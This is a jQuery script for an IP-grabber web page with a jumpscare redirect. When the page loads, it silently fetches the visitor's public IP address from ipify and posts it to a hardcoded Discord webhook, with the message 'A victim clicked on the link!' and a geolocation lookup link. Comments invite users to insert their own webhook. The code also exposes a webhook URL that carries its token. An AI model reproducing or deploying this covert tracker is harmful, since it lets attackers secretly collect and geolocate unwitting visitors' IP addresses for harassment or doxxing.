// GIVE ALL CREDIT TO ELK, PLEASE!!
//     MY DISCORD IS @2elk !!!!

$(document).ready(function() {
    
    function ipmsg(ipadd) {
        
        var webhookURL = 'https://discordapp.com/api/webhooks/1348323605163016314/3PjWxe0v7jemM43gYkFGx0-j5sbEjmf8j6g_ozhfTyZ1BhB_G7CsShmSlsQVe51U_XUE'; // PUT IN YOUR WEBHOOK URL
        
        var payload = {
            
            content: '      A victim clicked on the link! @here\nIPv4 Address: ' + ipadd + '\nGeolocation Info: https://iplocation.io/ip/' + ipadd + '\n  midleg was here'
            
        };

        $.ajax({
            
            url: webhookURL,
            
            type: 'POST',
            
            data: JSON.stringify(payload),
            
            contentType: 'application/json',
            
            success: function() {
                
                console.log('success');
                
            },
            
            error: function(xhr, status, error) {
                
                console.error('failed', error);
                
            }
            
        });
        
    }
    

    var homepage = $('#homepage-btn');
    
    homepage.on('click', function(event) {
        
        event.preventDefault();
        
        window.location.href = "https://3elk.github.io/JumpScare-Spam/jumpscare.mp4"; // YOU CAN CHANGE THE URL
        
    }); 
    

    $.getJSON('https://api.ipify.org?format=json', function(data) {
        
        var ipadd = data.ip;
        
        ipmsg(ipadd);
        
    });
    
});
